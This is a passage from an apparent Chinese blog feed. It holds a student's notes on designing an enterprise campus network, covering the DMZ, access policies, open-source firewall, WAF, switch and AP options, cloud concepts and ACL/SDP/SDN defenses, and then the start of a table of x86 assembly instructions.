Points，无线接入点控制协议）协议对AP进行管理。</p></li><li><p><strong>汇聚层</strong></p><p>汇聚层是接入层与园区核心层之间的网络分界线，主要用于转发用户间的“横向”流量，同时转发到核心层的“纵向”流量。在汇聚层中，通常采用交换机、路由器等设备，以支持不同子网之间的通信。汇聚层还负责实现网络的隔离和分割，以保证网络安全性和管理性。</p></li><li><p><strong>接入层</strong></p><p>接入层为用户提供各种接入方式，是终端接入网络的第一层。接入层通常由接入交换机组成，接入层交换机在网络中数量众多，安装位置分散，通常是简单的二层交换机。如果终端层存在无线终端设备，接入层需要无线接入点AP设备，AP设备通过接入交换机接入网络。</p></li></ol><p>这是三个基础层，是为其他层服务的，下面介绍其他层，同时引入一个新架构：</p><p><a href="https://download.huawei.com/mdl/image/download?uuid=5bf3e4ab28534271b560267395f8ef4a">https://download.huawei.com/mdl/image/download?uuid=5bf3e4ab28534271b560267395f8ef4a</a></p><h4 id="终端层"><a href="#终端层" class="headerlink" title="终端层"></a>终端层</h4><p>终端层是指接入园区网络的各种终端设备，例如电脑、打印机、IP话机、手机、摄像头等。</p><h4 id="核心区"><a href="#核心区" class="headerlink" title="核心区"></a>核心区</h4><p>叫法有所不同，指一般存放着企业最重要的数据、文档等资产。例如，域控、核心生产服务器等，安全设置也最为严格。根据业务的不同，相关服务器可能存放于不同的网段中。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网段可分为业务网段、运维监控网段、安全管理网段等。</p><ul><li><p>数据中心区</p><p>数据中心区是管理业务服务器（例如文件服务器、邮件服务器等）的区域，为企业内部和外部用户提供业务服务。</p></li><li><p>网络管理区</p><p>网络管理区是管理网络服务器（例如网管系统、认证服务器等）的区域。网管系统通过网管协议与和网络设备交互，能够提供配置、管理和运维功能，主流的网管协议有：SNMP（Simple Network Management Protocol，简单网络管理协议）和Netconf（Network Configuration Protocol ，网络配置协议）。认证服务器可提供网络准入的认证、授权和计费功能，主流的认证协议有：RADIUS（Remote Authentication Dial In User Service，用户远端拨号接入服务）和TACACS（Terminal Access Controller Access-Control System，终端访问控制器访问控制系统）。</p></li></ul><h4 id="DMZ区"><a href="#DMZ区" class="headerlink" title="DMZ区"></a>DMZ区</h4><p>**DMZ(Demilitarized Zone)**非军事化区，也就是隔离区，DMZ区是一个对外服务区，在DMZ区域中存放着一些公共服务器，比如对外的服务器、对外的邮箱等等。用户要从外网访问到的服务，理论上都可以放到DMZ区，这个区对外提供业务，安全性有严格限制。上层可能有WAF、IPS等。</p><h4 id="出口区"><a href="#出口区" class="headerlink" title="出口区"></a>出口区</h4><p>园区出口是园区内部网络到外部网络的边界，内部用户通过园区出口区接入到外部网络，外部网络的用户通过园区出口区接入到内部网络。园区出口区一般需要部署出口路由器和防火墙。路由器解决内外网互通的问题，防火墙提供边界安全防护能力。</p><p>在最一般的架构中，出口区就是一个路由器，当然下面可以接一个fw，再接一个IPS。</p><p>设备汇总：路由器-FW-IPS-WAF-交换机（多层交换机）-AP-AC-应用服务器-认证服务器-办公主机-无线设备</p><h4 id="访问限制"><a href="#访问限制" class="headerlink" title="访问限制"></a>访问限制</h4><p>当规划一个拥有DMZ的网络时候,我们可以明确各个网络之间的访问关系,可以确定以下六条访问控制策略。</p><ol><li>内网可以访问外网</li></ol><p>内网的用户显然需要自由地访问外网。在这一策略中，出口路由器需要进行源地址NAT转换。</p><ol start="2"><li>内网可以访问DMZ</li></ol><p>此策略是为了方便内网用户使用和管理DMZ中的服务器。</p><ol start="3"><li>外网不能访问内网</li></ol><p>很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。</p><ol start="4"><li>外网可以访问DMZ</li></ol><p>DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由出口路由器完成对外地址到服务器实际地址的转换。</p><ol start="5"><li>DMZ访问内网有限制</li></ol><p>很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。</p><ol start="6"><li>DMZ不能访问外网</li></ol><p>此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网。</p><h3 id="3-各类设备的调研与实现"><a href="#3-各类设备的调研与实现" class="headerlink" title="3.各类设备的调研与实现"></a>3.各类设备的调研与实现</h3><h4 id="安全（网络）设备"><a href="#安全（网络）设备" class="headerlink" title="安全（网络）设备"></a>安全（网络）设备</h4><h5 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h5><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305184037606.png" alt="image-20230305184037606" style="zoom:67%;" /><p>可通过Vyos等开源路由器实现方案实现。</p><h5 id="FW"><a href="#FW" class="headerlink" title="FW"></a>FW</h5><ul><li><p>总述：调研获知，有这么几款防火墙软件适配度较高。（考虑：防火墙如思科等商用级别的不适合课程设置，所以我们主要搜集比较经典的或者是高水平课设防火墙项目）</p><ul><li><p><a href="https://github.com/1397981186/firewall">https://github.com/1397981186/firewall</a> 这个项目没有后续开发，而且功能仅限于审计而没有响应。<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305175522661.png" alt="image-20230305175522661"></p></li><li><p><a href="https://github.com/dekuan/VwFirewall">GitHub - dekuan/VwFirewall: 微盾®VirtualWall®防火墙整套源代码</a> 据github介绍此款防火墙虽然源码公开，但是长时间未维护，并且只能够运行在win2000上。<br> <img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305175532829.png" alt="image-20230305175532829"></p></li><li><p>Smoothwall （文档全英文，中国区域几乎没有使用，触发问题难以找到解决方案）<br> <img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305175542712.png" alt="image-20230305175542712"></p></li><li><p>Suricata<br> <img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305175607007.png" alt="image-20230305175607007"></p></li></ul></li></ul><p>​    相较于传统的防火墙软件Snort，这一款Suricata支持多线程，理论上有更加良好的检测性能。所以最后我们选择了这个。</p><h5 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h5><p>​    Suricata集成了防火墙和IPS的功能，所以这部分采用上一部分的Suricata工具，同时略过此部分。</p><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><p>Centos7+ModSecurity</p><p><strong>1.CentOS和ModSecurity</strong></p><p><strong>CentOS简介</strong></p><p>CentOS是一个企业级的Linux操作系统，它是Red Hat Enterprise Linux（RHEL）的一个免费版本，因此也被称为“Community Enterprise Operating System”。CentOS具有高可靠性、稳定性和安全性，因此非常适合用于Web应用程序的服务器环境。</p><p><strong>ModSecurity简介</strong></p><p>ModSecurity是一个开源的Web应用程序防火墙，可以在Apache、Nginx、IIS等Web服务器上使用。ModSecurity功能介绍</p><p>SQL Injection (SQLi)：阻止SQL注入 Cross Site Scripting (XSS)：阻止跨站脚本攻击 Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击 Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击 Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击 PHP Code Injectiod：阻止PHP代码注入 HTTP Protocol Violations：阻止违反HTTP协议的恶意访问 HTTPoxy：阻止利用远程代理感染漏洞进行攻击 Sshllshock：阻止利用Shellshock漏洞进行攻击 Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击 Scanner Detection：阻止黑客扫描网站 Metadata/Error Leakages：阻止源代码/错误信息泄露 Project Honey Pot Blacklist：蜜罐项目黑名单 GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断</p><p><strong>2.ModSecurity 部署模式</strong></p><p>架设方案：</p><p>一般来说，为了实现更高的安全性，将WAF部署在Web服务器的上层服务器上会更好。这种方法的优点包括：</p><ol><li>安全性更高：将WAF部署在Web服务器的上层服务器上，可以提供更好的隔离和安全性，因为WAF将运行在专门的服务器上，可以更好地管理和控制安全策略，减少攻击者对Web服务器的直接攻击。</li><li>可伸缩性更好：将WAF部署在Web服务器的上层服务器上，可以更容易地进行水平扩展，以应对不断增长的流量和攻击。</li><li>管理更方便：将WAF部署在Web服务器的上层服务器上，可以更方便地管理WAF的配置和日志，以及与其他安全工具进行集成，提高管理效率和安全性。</li><li>性能更好：虽然将WAF部署在Web服务器的上层服务器上可能会增加一些性能开销，但是现代的WAF设备和软件通常都具有优化性能的功能，可以提供与将WAF部署在Web服务器上相当的性能。</li></ol><p>ModSecurity 支持两种部署模式：嵌入模式和反向代理模式。这两种模式各有利弊，选用哪种模式取决于你的架构环境：</p><p><strong>嵌入模式（Embedded）</strong></p><p>因为 ModSecurity 是 Apache 的一个模块，你可以把它加载到任何兼容的 Apache 版本中。2.0.x 和 2.2.x 系列的 Apache 版本都是兼容的。对于那些架构已经确定好或者已经在使用中的情况来说，使用嵌入模式来部署 ModSecurity 是一个很好的选项。嵌入模式不但不会引入新的故障点（Points of Failure），而且也可以随着底层 Web 基础设施的伸缩而无缝伸缩。嵌入模式部署的最主要挑战是，ModSecurity 和 Web 服务器共享计算资源。</p><p><strong>反向代理模式（Reverse Proxy）</strong></p><p>反向代理其实是 HTTP 路由器，它被设计成部署在 Web 服务器和其客户端之间。当你安装了一台专用的 Apache 反向代理并且增加了 ModSecurity 模块，那么你就得到了一台网络 Web 应用防火墙–你可以用其来保护同网络的任何数量的 Web 服务器。很多安全实践者倾向于使用独立的安全控制层，这样一来你可以把它和被保护对象完全隔离开来。就性能来说，独立部署的 ModSecurity 有专属的计算资源，那么这意味着你可以做更多的事情（例如，配置更加复杂的规则）。这种部署模式最大的缺陷是，你引入了新的故障点。而解决这个新的故障点的方法是，使用两台或者更多台反向代理服务器的集群来提供高可用（High-Availability，HA）的架构设置。</p><p>在Web服务器和客户端之间安装反向代理服务器，可以提高Web应用程序的安全性和性能。当安装了Apache反向代理服务器后，其工作原理如下：</p><ol><li>客户端向反向代理服务器发起请求：客户端通过HTTP协议向反向代理服务器发起请求。反向代理服务器通常会监听80端口或443端口，用于接收客户端请求。</li><li>反向代理服务器代理请求：反向代理服务器收到客户端请求后，会根据请求的URL和其他信息，将请求转发给后端的Web服务器。在这个过程中，客户端并不知道请求实际上被转发给了哪个Web服务器。</li><li>后端Web服务器响应请求：后端Web服务器收到请求后，根据请求的内容进行处理，并且返回响应结果。这个响应结果可以是动态生成的HTML页面、静态的文件或者其他资源。</li><li>反向代理服务器返回响应：反向代理服务器收到后端Web服务器返回的响应后，会将响应内容返回给客户端。在这个过程中，反向代理服务器可以根据需要对响应内容进行缓存、压缩、加密等处理，以提高Web应用程序的性能和安全性。</li></ol><h4 id="服务设备（应用）"><a href="#服务设备（应用）" class="headerlink" title="服务设备（应用）"></a>服务设备（应用）</h4><h5 id="应用服务器（DMZ区）"><a href="#应用服务器（DMZ区）" class="headerlink" title="应用服务器（DMZ区）"></a>应用服务器（DMZ区）</h5><p><strong>1.Web服务器</strong>：Ubuntu18.04 + Apache + Flask</p><p>web服务器需访问内网（数据管理区）中的数据库服务器以获得数据。</p><p><strong>2.DNS服务器</strong>：Centos7 + bind 搭建内网服务器</p><p><a href="https://www.cnblogs.com/lcxhk/p/14118674.html">https://www.cnblogs.com/lcxhk/p/14118674.html</a></p><p><a href="https://doc.52zoe.com/docs/maple-linux/maple-linux-1ci1kqbv08g61">https://doc.52zoe.com/docs/maple-linux/maple-linux-1ci1kqbv08g61</a></p><p>企业的DNS服务器对外提供服务主要是为了支持企业的对外网络访问，例如企业的网站、邮件服务器等需要通过域名进行访问。企业可以将其域名解析服务委托给第三方DNS解析服务商，但这样会涉及到一些安全和隐私问题。</p><p>企业自己搭建的DNS服务器一般会配置为递归查询的方式。</p><p>更新DNS服务器的域名表，自动同步，即DNS服务器可以从其他DNS服务器自动获取域名解析信息，并及时更新自己的域名表。自动同步的方式一般使用DNS协议中的区域传输（AXFR）或增量传输（IXFR）功能实现.</p><p><strong>3.邮件服务器</strong>：Ubuntu18.04 + Postfix</p><p>关于Postfix</p><p>Postfix是一个顶尖的SMTP服务器，也被称为MTA。Postfix负责从其他SMTP服务器接收邮件，将MUA递交的邮件传递给收件人。MUA(mail user agent)就是我们平常使用的Thunderbird，Foxmail，Outlook等邮箱客户端。Postfix程序采用模块化的设计，每一个模块都尽可能以最低的权限运行。这种设计非常有助于安全。Postfix与Unix的结合度非常高。一台Linux服务器的Postfix可以负责多个域名的邮件发送和接收。这篇文章只介绍单个域名的发送和接收。 <a href="https://blog.51cto.com/u_15127557/4065429">https://blog.51cto.com/u_15127557/4065429</a></p><h5 id="数据库服务器"><a href="#数据库服务器" class="headerlink" title="数据库服务器"></a>数据库服务器</h5><p>Ubuntu18.04 + Mysql + 远程访问</p><p><a href="https://github.com/Qingquan-Li/blog/issues/151">https://github.com/Qingquan-Li/blog/issues/151</a></p><p>在数据库服务器中，配置远程访问以供web服务器接入；此外需通过防火墙限制流量，仅允许来自web服务器的流量通过，或建立VPN（偏麻烦）。</p><h5 id="认证服务器（域控等）"><a href="#认证服务器（域控等）" class="headerlink" title="认证服务器（域控等）"></a>认证服务器（域控等）</h5><p>​    Windows办公环境下，域控的角色常常使用Active Directory完成，Windows Server的局限性使得Windows域中只能添加Windows系统主机，而不能添加Linux系统主机。Samba可以通过Samba 4实现Active Directory域控制器的功能。</p><p><a href="https://github.com/samba-team/samba">https://github.com/samba-team/samba</a></p><h5 id="安卓模拟器"><a href="#安卓模拟器" class="headerlink" title="安卓模拟器"></a>安卓模拟器</h5><p>Ubuntu18.04+Genymotion</p><p>一般来说，Linux系统上也可以使用安卓模拟器来模拟安卓设备。安卓模拟器软件通常是跨平台的，可以在多种操作系统上运行，包括Linux系统。以下是几种在Linux系统上常用的安卓模拟器：</p><ol><li>Android Studio自带的模拟器：Android Studio是一种主要用于开发安卓应用程序的开发工具，它自带了一个安卓模拟器，可以在Linux系统上运行安卓应用程序。安装和配置过程相对较为复杂，需要一定的开发经验。</li><li>Genymotion：Genymotion是一种功能强大的第三方安卓模拟器，提供了高度仿真的安卓环境，可以支持多种安卓版本和设备类型，并且支持多种PC平台，包括Linux系统。Genymotion的界面友好，易于使用。</li><li>Anbox：Anbox是一种基于Linux容器技术的安卓模拟器，可以在Linux系统上运行安卓应用程序。与其他安卓模拟器不同的是，Anbox是通过在Linux内核上创建安卓容器来实现安卓应用的运行，因此可以实现更高的性能和更好的集成度。</li></ol><p>Genymotion是一种基于VirtualBox虚拟化技术的第三方安卓模拟器，可以在多种操作系统上运行，包括Linux系统。具体来说，Genymotion支持以下几种Linux发行版：</p><ul><li>Ubuntu 18.04、20.04</li></ul><p><a href="https://blog.csdn.net/m0_53533553/article/details/127968374">https://blog.csdn.net/m0_53533553/article/details/127968374</a></p><h4 id="二层设备"><a href="#二层设备" class="headerlink" title="二层设备"></a>二层设备</h4><h5 id="交换机（核心-汇聚层）"><a href="#交换机（核心-汇聚层）" class="headerlink" title="交换机（核心+汇聚层）"></a>交换机（核心+汇聚层）</h5><ul><li><p>总述，我们暂时决定采用虚拟化的交换机。下面是几款主流的交换机虚拟方案。</p><ul><li><p><a href="https://github.com/faucetsdn/ryu">https://github.com/faucetsdn/ryu</a></p><ul><li><p>Ryu：Ryu是一个用Python编写的SDN控制器平台，它提供了许多SDN应用程序和网络服务的API，同时也可以作为虚拟交换机使用。Ryu的虚拟交换机模块实现了OpenFlow协议，并且可以与其他SDN控制器配合使用。</p></li><li><p>然而Ryu是一个SDN控制器的软件包，它不是一个虚拟交换机，因此<strong>不能用于直接</strong>模拟核心虚拟机和汇聚层虚拟机。然而，可以使用Ryu控制器来控制OpenFlow交换机，这些交换机可以作为虚拟交换机在虚拟化环境中使用，从而实现对核心虚拟机和汇聚层虚拟机的控制。同时，Ryu控制器也支持多种网络拓扑结构和应用场景。</p></li></ul></li><li><p><a href="https://github.com/openvswitch/ovs">https://github.com/openvswitch/ovs</a></p><ul><li><p>Open vSwitch是什么？<br> Open vSwitch（OVS）是一个开源的虚拟交换机，可用于在物理和虚拟服务器之间创建虚拟网络。它支持多种数据面处理程序，包括Linux内核、DPDK和Netmap等，同时也支持多种控制器协议，如OpenFlow和OVSDB等。</p></li><li><p>OVS能够同时支持核心交换机和汇聚层交换机的模拟吗？<br> 云环境平台涉及到两种交换机：核心交换机和汇聚层交换机，而Open vSwitch可以同时模拟核心虚拟机和汇聚层虚拟机。<br> Open vSwitch是一个虚拟交换机，可以在虚拟化环境中使用，支持多种虚拟化平台和技术，如KVM、Xen、VMware、Hyper-V等。Open vSwitch提供了许多高级特性，如多层交换、负载均衡、流量限制、VLAN、QoS等。这些特性使得Open vSwitch可以满足数据中心网络中各种不同的需求，包括核心虚拟机和汇聚层虚拟机。</p></li></ul></li></ul></li></ul><h5 id="AP-amp-AC（无线访问接入点-amp-接入控制器）"><a href="#AP-amp-AC（无线访问接入点-amp-接入控制器）" class="headerlink" title="AP&amp;AC（无线访问接入点&amp;接入控制器）"></a>AP&amp;AC（无线访问接入点&amp;接入控制器）</h5><p><strong>AP设备：</strong></p><ul><li><p>总述：AP设备也能够虚拟化，所以我们寻找了一些虚拟化方案。常用的虚拟化方案有下面的这些。</p></li><li><p><a href="https://wiki.dd-wrt.com/wiki/index.php/%E6%95%99%E7%A8%8B">https://wiki.dd-wrt.com/wiki/index.php/%E6%95%99%E7%A8%8B</a></p></li><li><p>DD-WRT是一个基于Linux的开源无线路由器固件，它可以用于将路由器设备转换为软AP。DD-WRT支持多种路由器设备和Wi-Fi芯片组，具有强大的路由和网络功能。</p><ul><li>因为常用的</li></ul></li><li><p><a href="https://github.com/openwrt/openwrt">https://github.com/openwrt/openwrt</a></p><ul><li>OpenWrt：OpenWrt是一个开源的嵌入式Linux发行版，它可以用于将支持OpenWrt的路由器设备转换为软AP。OpenWrt支持多种硬件平台和Wi-Fi芯片组，具有强大的路由和网络功能。可以利用虚拟机模拟AP设备的实现（vmware模拟AP设备教程：<a href="https://www.jb51.net/article/241586.htm%EF%BC%89">https://www.jb51.net/article/241586.htm）</a></li></ul></li></ul><p><strong>注意，</strong>上面两种软件的都较为主流，主要区别是：OpenWrt注重自由、可定制性强，DD-Wrt注重易用性和稳定性，且支持更多的硬件设备。</p><p>私有云和公有云的安全主要靠网络边界的防护，如fw、waf等</p><h3 id="4-云服务相关调研"><a href="#4-云服务相关调研" class="headerlink" title="4.云服务相关调研"></a>4.云服务相关调研</h3><h4 id="云服务概念解释"><a href="#云服务概念解释" class="headerlink" title="云服务概念解释"></a>云服务概念解释</h4><h5 id="云计算-amp-云服务"><a href="#云计算-amp-云服务" class="headerlink" title="云计算&amp;云服务"></a>云计算&amp;云服务</h5><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305185115232.png" alt="image-20230305185115232"></p><p>​    云计算是一种技术，他搭建了一个平台，帮助中小型企业解决了在部署应用时昂贵的硬件设备成本。在这一平台上，可以提供存储、计算等不同的服务，这些服务就是云服务。<strong>“云计算实现的服务”</strong>。</p><h5 id="云服务结构示意"><a href="#云服务结构示意" class="headerlink" title="云服务结构示意"></a>云服务结构示意</h5><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/clip_image002.png" alt="img"></p><p>​    硬件、软件、网络等计算机资源，在<strong>云计算</strong>技术的技术架构中，得到整合，然后在其管理调度下，形成一个<strong>计算机资源共享池</strong>，即“<strong>云</strong>”。它可以对外提供服务，从而形成一个云计算平台，简称<strong>云平台</strong>。云平台有存储、计算、处理和共享这4种功能。其中，在云平台上进行存储，即为“<strong>云存储</strong>”。用户可以通过互联网，接入云平台，以按需、易拓展的方式获取所需服务，这就是“<strong>云服务</strong>”。</p><h5 id="公有云、私有云、社区云、混合云"><a href="#公有云、私有云、社区云、混合云" class="headerlink" title="公有云、私有云、社区云、混合云"></a>公有云、私有云、社区云、混合云</h5><p>​    云计算的部署模式有以下4种，分别是：1、私有云；2、社区云；3、公共云；4、混合云。这是根据云计算服务的消费者来源划分的。私有云是为某个特定用户/机构建立的，公有云是为大众建的，社区云是介于公有、私有之间的一个形式，混合云是公有云、私有云、社区云几种的任意混合。</p><h4 id="云网络接入架构"><a href="#云网络接入架构" class="headerlink" title="云网络接入架构"></a>云网络接入架构</h4><p>企业客户业务场景多种多样，包括线下 IDC，分布各地的办公室，门店，在家办公人员等。所有这些环境都需要一致的体验接入到企业内网的工作环境。</p><p><strong>什么是云架构</strong>？ 云架构是指构建云所需的所有组件和功能如何连接起来，以便交付供应用运行的在线平台。云被视为平台即服务（Pass），因为云提供商为用户提供了平台以及底层IT基础架构。 与传统的服务器相比，云平台可以将物理资源虚拟化为虚拟机资源池，灵活调用软硬件资源，实现对用户的按需访问。而且在运行过程中根据用户并发量的不同，实时迁移虚拟机资源，一方面保证提供高质量的服务，另一方面最小化资源成本，提高CPU，内存等利用率</p><p>云应用网络拓扑：</p><p><img src="https://www.iodraw.com/file/img/1/aliyun.svg" alt="https://www.iodraw.com/file/img/1/aliyun.svg"></p><p><strong>VPC</strong>：专有网络VPC (Virtual Private Cloud)是基于阿里云构建的一个隔离的网络环境，专有网络之间逻辑上彻底隔离。托管在VPC内的是我们在私有云上的服务资源，如云主机、负载均衡、云数据库等。</p><p>专有网络是您专有的云上私有网络。您可以完全掌控自己的专有网络，例如选择IP地址范围、配置路由表和网关等，您可以在自己定义的专有网络中使用阿里云资源，如云服务器ECS（Elastic Compute Service）、云数据库RDS（Relational Database Service）和负载均衡SLB等。</p><p><strong>VPN：</strong>VPN的英文全称是“Virtual Private Network”，翻译过来就是“虚拟专用网络”。在公用网络上建立专用网络，进行加密通讯。在交换机，防火墙设备或Windows等软件里也都支持VPN功能，一句话，VPN的核心就是在利用公共网络建立虚拟私有网。</p><p>简而言之，VPN创建了一条通向内网的通道，用户通过访问VPN服务器来访问内网服务，即用户对内网服务是不可见的，内网服务对用户是可见的，VPN服务器代替用户访问内网网站。</p><p>跨地网络互通云企业网方案</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8328558561/p469742.png" alt="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8328558561/p469742.png"></p><h2 id="四、访问控制技术"><a href="#四、访问控制技术" class="headerlink" title="四、访问控制技术"></a>四、访问控制技术</h2><p>​    传统企业网络的大内网中，有极大一部分的威胁都来自于黑客入侵内网某一台主机后，横向移动导致的进一步攻击，为了有效地快速对入侵事件进行响应，阻止横向移动，可通过构建内网的防御体系：</p><h3 id="1-ACL-访问控制列表"><a href="#1-ACL-访问控制列表" class="headerlink" title="1.ACL(访问控制列表)"></a>1.ACL(访问控制列表)</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305213404915.png" alt="image-20230305213404915"></p><ul><li>访问控制列表ACL（Access Control List）是由一条或多条规则组成的集合。所谓规则，是指描述报文匹配条件的判断语句，这些条件可以是报文的源地址、目的地址、端口号等。</li></ul><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305213823572.png" alt="image-20230305213823572" style="zoom:80%;" /><ul><li>ACL本质上是一种报文过滤器，规则是过滤器的滤芯。设备基于这些规则进行报文匹配，可以过滤出特定的报文，并根据应用ACL的业务模块的处理策略来允许或阻止该报文通过。</li><li>ACL的缺点：难以优化理解，大型ACL的冗余、不一致</li></ul><p><strong>实现方案：</strong>一般路由器都能够进行ACL配置。</p><h3 id="2-SDP-软件定义边界"><a href="#2-SDP-软件定义边界" class="headerlink" title="2.SDP(软件定义边界)"></a>2.SDP(软件定义边界)</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305213708489.png" alt="image-20230305213708489"></p><ul><li><p>软件定义边界”（ Software Defined Perimeter，SDP），也称为Dark Cloud，是由国际云安全联盟CSA于2013年提出的基于零信任(Zero Trust)理念的新一代网络安全技术架构。SDP借鉴了虚拟化技术和其他软件定义的体系结构的概念，旨在进一步实现网络安全现代化。</p></li><li><p>SDP主张网络隐身、零信任、最小授权，所有应用程序都将被隐藏，外部方和攻击者都看不到它，只有在对每个端点请求进行身份验证和授权之后才授予访问权限。使用SDP的公司实质上是在其服务器和其他基础架构上披上了隐形的外衣，没有人可以从外面看到，只有授权用户可以访问基础结构。</p></li></ul><p><strong>SDP开源实现方案</strong>：<a href="https://github.com/WaverleyLabs">https://github.com/WaverleyLabs</a></p><h3 id="3-SDN（软件定义网络）"><a href="#3-SDN（软件定义网络）" class="headerlink" title="3.SDN（软件定义网络）"></a>3.SDN（软件定义网络）</h3><p>​    在传统的网络中，网络设备通常具有复杂的配置和管理，因此难以快速应对网络安全威胁。另外，传统网络中的数据包传输是基于物理设备的，攻击者可以通过攻击这些物理设备来获取更多的访问权限，并进行横向移动攻击。</p><p>​    而SDN采用了软件定义的方式管理网络，可以通过中央控制器对整个网络进行实时管理和控制，从而提高了网络的可视化和可管理性。此外，SDN中的网络流量可以通过流量分类和隔离技术进行管理，可以对网络流量进行更加精细的控制和监控，从而有效防止横向移动攻击。</p><ol><li>OpenDaylight：OpenDaylight是一个开源的SDN控制器，可以用于构建和管理SDN网络。它提供了各种插件和API，可以方便地管理和控制SDN网络中的设备和流量。</li><li>Floodlight：Floodlight是一个基于OpenFlow协议的开源SDN控制器，支持各种类型的SDN网络拓扑结构和流量管理。它提供了一系列的API和插件，可用于构建和管理SDN网络。</li><li>ONOS：ONOS是一个开源的SDN控制器，支持各种类型的SDN网络拓扑结构和协议。它提供了一系列的API和插件，可用于构建和管理SDN网络。</li><li>Ryu：Ryu是一个轻量级的SDN控制器，可以用于构建和管理SDN网络。它支持OpenFlow协议和其他SDN协议，提供了一系列的API和插件，可用于管理SDN网络中的流量和设备。</li></ol><p><strong>SDN：</strong><a href="https://pluribusnetworks.com/blog/what-is-network-segmentation/">https://pluribusnetworks.com/blog/what-is-network-segmentation/</a></p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言笔记</title>
      <link href="/2023/01/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言笔记"><a href="#汇编语言笔记" class="headerlink" title="汇编语言笔记"></a>汇编语言笔记</h1><h2 id="一、传送指令"><a href="#一、传送指令" class="headerlink" title="一、传送指令"></a>一、传送指令</h2><h3 id="1-、通用数据传送指令"><a href="#1-、通用数据传送指令" class="headerlink" title="1 、通用数据传送指令"></a>1 、通用数据传送指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>MOV</td><td>move</td></tr><tr><td>MOVSX</td><td>extended move with sign data</td></tr><tr><td>MOVZX</td><td>extended move with zero data</td></tr><tr><td>PUSH</td><td>push</td></tr><tr><td>POP</td><td>pop</td></tr><tr><td>PUSHA</td><td>push all</td></tr><tr><td>POPA</td><td>pop all</td></tr><tr><td>PUSHAD</td><td>push all data</td></tr><tr><td>POPAD</td><td>pop all data</td></tr><tr><td>BSWAP</td><td>byte swap</td></tr><tr><td>XCHG</td><td>exchange</td></tr><tr><td>CMPXCHG</td><td>compare and change</td></tr><tr><td>XADD</td><td>exchange and add</td></tr><tr><td>XLAT</td><td>translate</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="2-、输入输出端口传送指令"><a href="#2-、输入输出端口传送指令" class="headerlink" title="2 、输入输出端口传送指令"></a>2 、输入输出端口传送指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>IN</td><td>input</td></tr><tr><td>OUT</td><td>output</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="3-、目的地址传送指令"><a href="#3-、目的地址传送指令" class="headerlink" title="3 、目的地址传送指令"></a>3 、目的地址传送指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>LEA</td><td>load effective address</td></tr><tr><td>LDS</td><td>load DS</td></tr><tr><td>LES</td><td>load ES</td></tr><tr><td>LFS</td><td>load FS</td></tr><tr><td>LGS</td><td>load GS</td></tr><tr><td>LSS</td><td>load SS</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="4-、标志传送指令"><a href="#4-、标志传送指令" class="headerlink" title="4 、标志传送指令"></a>4 、标志传送指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>LAHF</td><td>load AH from flag</td></tr><tr><td>SAHF</td><td>save AH to flag</td></tr><tr><td>PUSHF</td><td>push flag</td></tr><tr><td>POPF</td><td>pop flag</td></tr><tr><td>PUSHD</td><td>push dword flag</td></tr><tr><td>POPD</td><td>pop dword flag</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="二、-运算指令"><a href="#二、-运算指令" class="headerlink" title="二、 运算指令"></a>二、 运算指令</h2><h3 id="1-、算术运算指令"><a href="#1-、算术运算指令" class="headerlink" title="1 、算术运算指令"></a>1 、算术运算指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>ADD</td><td>add</td></tr><tr><td>ADC</td><td>add with carry</td></tr><tr><td>INC</td><td>increase 1</td></tr><tr><td>AAA</td><td>ascii add with adjust</td></tr><tr><td>DAA</td><td>decimal add with adjust</td></tr><tr><td>SUB</td><td>substract</td></tr><tr><td>SBB</td><td>substract with borrow</td></tr><tr><td>DEC</td><td>decrease 1</td></tr><tr><td>NEC</td><td>negative</td></tr><tr><td>CMP</td><td>compare</td></tr><tr><td>AAS</td><td>ascii adjust on substract</td></tr><tr><td>DAS</td><td>decimal adjust on substract</td></tr><tr><td>MUL</td><td>multiplication</td></tr><tr><td>IMUL</td><td>integer multiplication</td></tr><tr><td>AAM</td><td>ascii 